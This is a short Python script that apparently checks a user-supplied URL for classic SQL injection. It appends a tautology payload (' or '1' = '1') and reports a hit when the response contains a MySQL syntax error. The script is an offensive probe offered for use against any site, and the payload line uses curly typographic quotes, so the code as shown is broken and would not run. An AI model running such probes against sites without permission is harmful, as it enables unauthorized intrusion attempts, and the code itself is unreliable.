import sys
import urllib
import urllib.request

fullurl = input("Please specify the full vulnerable url:  ")

for carg in sys.argv:
    if carg == "-w":
        argnum = sys.argv.index(carg)
        argnum += 1
        fullurl = sys.argv[argnum]

resp = urllib.request.urlopen(fullurl + “=1\’ or \’1\’ = \’1\””)

body = resp.read()

fullbody = body.decode('utf-8')

if "You have an error in your SQL syntax" in fullbody:
    print ("The website is classic SQL injection vulnerable!")

else:
    print ("The website is not classic SQL injection vulnerable!")

